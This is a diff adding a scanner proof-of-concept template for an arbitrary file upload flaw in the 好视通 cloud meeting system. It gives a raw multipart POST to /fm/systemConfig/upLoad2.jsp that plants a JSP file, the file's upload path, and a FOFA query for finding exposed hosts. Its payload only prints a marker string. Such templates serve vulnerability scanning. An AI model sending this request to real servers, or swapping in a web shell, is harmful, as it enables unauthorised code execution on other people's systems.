@@ -1,0 +1,59 @@
+id: poc-ms1va9845amsx44g
+info:
+  name: 好视通云会议 upLoad2.jsp 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ms1va9845amsx44g'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ms1va9845amsx44g
+    fofa: app:"好视通-云会议"
+http:
+- raw:
+  - 'POST /fm/systemConfig/upLoad2.jsp HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    --1515df1sdfdsfddfs
+
+
+    Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    <% out.print("dudesuite"); %>
+
+
+    --1515df1sdfdsfddfs--
+
+
+    # 响应代码特征
+
+    302
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /fm/upload/dudesuite.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 302
+    type: status
